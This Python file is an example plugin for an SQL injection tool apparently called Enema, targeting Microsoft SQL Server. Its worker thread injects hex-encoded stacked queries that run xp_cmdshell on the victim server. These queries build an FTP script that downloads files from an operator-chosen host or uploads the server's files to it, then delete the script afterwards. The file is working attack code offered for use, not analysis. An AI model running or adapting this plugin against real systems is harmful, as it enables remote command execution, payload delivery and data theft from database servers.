"""
    Enema plugin (mssql): Custom plugin example
    Copyright (C) 2012 Custom developer
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import os

""" core.txtproc - Text operations, encodings etc """
import core.txtproc

""" core.e_const - Global constants """
from core.e_const import CONFIG_PATH

"""
core.http - HTTP handling module.

HTTP Request method - httpRequest(self, query, isCmd, vars, blind=False)
query(str) - Sql query. E. g. "select user"
isCmd(bool) - True: Just send request. False: Parse/Fetch information from. Useful for stacked queries.
vars(dict)- parameters from Main GUI and plugin GUI
------------------
Main GUI Parameters list (vars):

'url' : (str) URL "http://site.com/xxx?id=45&abc=xyz ......"
'method' : (str) Contains request method "POST" or "GET"
'mp' : (str) Match pattern from pereferences
'ms' : (str) Match symbol from pereferences
'threads' : (int) Count of threads from pereferences
'timeOut' : (int) Timeout of threads from pereferences
'time' : (int) Delay for time-based blind sql injection 
'blind_inj_type' : (str) Contains "Time" or "Boolean". (indicates blind injection types: Time-based or Boolean-Based)
'bool_pattern' : (str) String pattern for 'True' response. (Boolean-based blind)
'max_lag' : (float) Maximum allowed lag time (Time-Based blind)
'hexed' : (bool) Encode stacked query to hex
'auto_detect' : (bool) Autodetect 'True' response time (Time-Based Blind)
'true_time' : (float) 'True' response time (Time-Based Blind)
'encoding' : (str) Character encoding from pereferences (default: windows-1251)
'isRandomUpCase' : (bool) 'True': Random Upper query string (from Pereferences) 
'accept_cookies' : (bool) 'True' : Accept Cookies (from Pereferences)
'dbListCount' : (int) Count of fetched databases
'dbName' : (str) Current selected db name
'notInArray' : (bool) Not in array method selected
'notInSubstring' : (bool) Not in substring method selected
'ordinal_position' : (bool) ordinal_position method selected
'LIMIT' : (bool) LIMIT method selected
'tblTreeCount' : (int) Count of tables in Columns field (right)
'query_cmd' : (str) Query string from field in Query tab
'isStacked' : (bool) Stacked query or not
'data' : (str) Post Data

'user_agent' : (str) User-Agent
'cookie' :  (str) Cookie
'referer' :  (str) Referer
'x_forwarded_for' :(str) X-Forwarded-For
'custom_header_name' : (str) Name of custom header
'custom_header' : (str) Custom header value
'header_urlencode' : (bool) Url encode header or not

'db_type' : (str) current db type ("MSSQL", "MySQL" ....)
'inj_type' : (str) injection method ("ERROR-BASED", "UNION-BASED")
'table' : (str) Table name from Dump tab
'key' : (str) Primary Key from Dump tab
'columns' : (list) columns from Dump tab
'fromPos' : (int) Begin position from Dump tab
'toPos' :  (int) End position from Dump tab
------------------
blind (bool) - Blind injection type or not
"""

from core.http import HTTP_Handler

from PyQt4 import QtCore, QtGui

""" 
Importing Ui class from code generated by pyuic util (ui/Ui_ftp.py)
File name generated by pyuic must starts with "Ui_"
"""

from .ui.Ui_ftp_example import Ui_ftpWidget as UiCode


"""
    ---Plugin information---
    PLUGIN_NAME - upper case string variable. Using spaces not recommended.
    PLUGIN_GROUP - Plugin developed for attack against (mysql, mssql, common, etc ...). Using spaces not recommended.
    PLUGIN_CLASS_NAME  - Gui class name that will be imported by Enema.
    PLUGIN_DESCRIPTION - Tell us about your plugin :)
"""

PLUGIN_NAME = "FTP_EXAMPLE"
PLUGIN_GROUP = "mssql"
PLUGIN_CLASS_NAME = "FtpWidget_EXAMPLE"
PLUGIN_DESCRIPTION = "FTP file transfer using SEND or GET command"

""" GUI Class """
class FtpWidget_EXAMPLE(QtGui.QWidget):
    """ LOG SIGNAL, sending Log messages from plugin, to Enema log field. """ 
    logSignal = QtCore.pyqtSignal(str)
     
    def __init__(self, vars, qstrings, parent=None):
        QtGui.QWidget.__init__(self, parent, QtCore.Qt.Tool)
        self.ui = UiCode()
        self.ui.setupUi(self)
        self.setWindowModality(QtCore.Qt.ApplicationModal)
        self.vars = vars
        """ qstrings (QSettings) - list of all query strings loaded from file settings/qstrings.ini"""
        self.qstrings = qstrings

        """ Hide progressBar """
        self.ui.progressBar.hide()
        """ ftpButton 'clicked' signal connect """
        self.ui.ftpButton.clicked.connect(self.ftpButton_OnClick)
        
        """ Your gui setting loading (if exists) """
        #Load config
        if os.path.exists(CONFIG_PATH):
            settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.IniFormat)
            self.ui.lineIP.setText(settings.value(PLUGIN_NAME + '/ip', ''))
            self.ui.lineFtpLogin.setText(settings.value(PLUGIN_NAME + '/login', ''))
            self.ui.lineFtpPwd.setText(settings.value(PLUGIN_NAME + '/password', ''))
            self.ui.lineFtpFile.setText(settings.value(PLUGIN_NAME + '/files', ''))
            self.ui.lineFtpPath.setText(settings.value(PLUGIN_NAME + '/path', ''))
            """ Correcting widget position """
            if settings.value("Main/window_position") is not None: 
                self.move(settings.value("Main/window_position"))
        #---

    #Emiting log message, don't touch
    def emitLog(self, logStr):
        self.logSignal.emit(logStr)
    
    #Hidding progressbar when task is done
    def taskDone(self):
        self.ui.progressBar.hide()

    #Busy check, don't touch
    def isBusy(self):
        try:
            if self.worker.isRunning():
                return True
        except AttributeError:
            return False
            
    """ Executing this code when ftpButton clicked """
    #FTP Upload button click        
    def ftpButton_OnClick(self):
        if self.isBusy():
            return
        #Adding variables from plugin widget
        ftpPath = self.ui.lineFtpPath.text()
        """ collecting our custom parameters from Plugin gui """
        if len(ftpPath) > 0:
            if ftpPath[-1] != "\\":
                ftpPath += "\\"
        self.vars['login'] = self.ui.lineFtpLogin.text()
        self.vars['password'] = self.ui.lineFtpPwd.text()
        self.vars['ftpFiles'] = self.ui.lineFtpFile.text().split(";")
        self.vars['ftpPath'] = ftpPath
        self.vars['ip'] = self.ui.lineIP.text()
        if self.ui.radioGet.isChecked():
            self.vars['ftp_mode'] = 'get'
        else:
            self.vars['ftp_mode'] = 'send'
        
        #---
        #Show progressBar
        self.ui.progressBar.show()
        """ Worker Thread for Plugin """
        self.worker = Worker(self.vars, self.qstrings)
        
        #Signal connects
        """ Recieving log messages from Worker """
        self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.QueuedConnection)
        """ Recieving Task Done signal from Worker """
        self.worker.taskDoneSignal.connect(self.taskDone, type=QtCore.Qt.QueuedConnection)
        #---
        """ Starting worker """
        self.worker.start()
    
    """ Saving gui settings to config when Plugin Widget Closing """
    #When widget closing
    def closeEvent(self, event):
        #Saving settings
        settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.IniFormat)
        settings.setValue(PLUGIN_NAME + '/ip', self.ui.lineIP.text())
        settings.setValue(PLUGIN_NAME + '/login', self.ui.lineFtpLogin.text())
        settings.setValue(PLUGIN_NAME + '/password', self.ui.lineFtpPwd.text())
        settings.setValue(PLUGIN_NAME + '/files', self.ui.lineFtpFile.text())
        settings.setValue(PLUGIN_NAME + '/path', self.ui.lineFtpPath.text())
        settings.setValue(PLUGIN_NAME + '/get', self.ui.radioGet.isChecked())
        settings.setValue(PLUGIN_NAME + '/send', self.ui.radioSend.isChecked())
        settings.sync()

    
class Worker(QtCore.QThread):

    taskDoneSignal = QtCore.pyqtSignal()
    logSignal = QtCore.pyqtSignal(str)
        
    def __init__(self, vars, qstrings):
        QtCore.QThread.__init__(self)
        self.vars = vars
        self.qstrings = qstrings
        self.wq = HTTP_Handler()
        self.wq.logSignal.connect(self.log)
        
    def log(self, logStr):
        self.logSignal.emit(logStr)
            
    def run(self):
        self.logSignal.emit("+++ [" + PLUGIN_NAME + "]: TASK STARTED +++")
        #--------Task----------
        """ Runing methods here"""
        self.ftpTransferTask()
        #-----------------------
        self.taskDoneSignal.emit()
        self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
        
    """ Method """
    def ftpTransferTask(self):
        #if defined non-standart ftp port
        ipaddr = self.vars['ip'].replace(":", " ")
        ftpFiles = self.vars['ftpFiles']
        tmp_file = self.vars['ftpPath'] + "xftp.txt"
        qString = self.qstrings.value('mssql_error_based/exec_hex')
        
        #del ..\temp\ftp.txt /Q
        hex = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #echo open 127.0.0.1 21> ..\temp\ftp.txt
        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo open " + ipaddr + "> " + tmp_file + "'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #echo login>> ..\temp\ftp.txt
        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo " + self.vars['login'] + ">> " + tmp_file + "'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #echo password>> ..\temp\ftp.txt
        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo " + self.vars['password'] + ">> " + tmp_file + "'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        for file in ftpFiles:
            #Use SEND or GET ftp command?
            if self.vars['ftp_mode'] == "get":
                #echo get file.exe c:\path\file.exe>> ..\temp\ftp.txt
                hex = core.txtproc.strToHex("master..xp_cmdshell 'echo get " + file + " " + self.vars['ftpPath']\
                + file + ">> " + tmp_file + "'", True)
                query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
            else:
                #echo send c:\path\file.exe>> ..\temp\ftp.txt
                hex = core.txtproc.strToHex("master..xp_cmdshell 'echo send " + self.vars['ftpPath'] +  file + ">> " + tmp_file + "'", True)
                query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
            self.wq.httpRequest(query, True, self.vars)
            
        #echo bye>> ..\temp\ftp.txt
        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo bye>> " + tmp_file + "'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #ftp -s:..\temp\ftp.txt IP
        hex = core.txtproc.strToHex("master..xp_cmdshell 'ftp -s:" + tmp_file + "'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #del ..\temp\ftp.txt /Q
        hex = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
